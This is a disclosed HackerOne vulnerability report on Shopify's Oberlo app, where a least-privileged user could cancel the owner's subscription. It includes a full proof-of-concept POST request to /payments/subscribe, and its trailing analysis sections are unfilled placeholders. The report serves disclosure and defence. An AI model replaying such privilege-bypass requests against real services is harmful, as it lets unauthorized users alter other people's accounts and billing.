---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1084865'
original_report_id: '1084865'
title: '[h1-2102] [Oberlo] Least privileged user can cancel account owner''s subscription
  via POST on  /payments/subscribe'
weakness: Improper Access Control - Generic
team_handle: shopify
created_at: '2021-01-22T21:02:05.779Z'
disclosed_at: '2024-01-17T18:26:30.756Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 37
asset_identifier: Shopify Developed Apps
asset_type: OTHER
max_severity: medium
tags:
- hackerone
- improper-access-control-generic
---

# [h1-2102] [Oberlo] Least privileged user can cancel account owner's subscription via POST on  /payments/subscribe

## Metadata

- HackerOne Report ID: 1084865
- Weakness: Improper Access Control - Generic
- Program: shopify
- Disclosed At: 2024-01-17T18:26:30.756Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

Within Oberlo, it's possible to have a bare permission user with only access to the dashboard. This user can make an API call which will cancel the subscription.

## Steps To Reproduce:
[add details for how we can reproduce the issue]

1) Have a `Boss subscription` account on app.oberlo.com
2) Within this account, have 2 users: `userA` is our admin, and `userB` is our attacker with only `Dashboard` permissions:

{F1168406}

3) Log in as `User B` and make the following call:

```
POST /payments/subscribe HTTP/1.1
Host: app.oberlo.com
Connection: close
Content-Length: 19
sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"
Accept: application/json, text/plain, */*
█████
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: https://app.oberlo.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://app.oberlo.com/settings/other
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: <REDACTED>


{
"planId":10
}

```

4) You should get a 200 response
5) Log back in as `UserA` and see that your subscription is set to the "Free Tier" as soon as the current billing cycle finishes.

## Impact

Least privileged users can modify subscription tiers

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
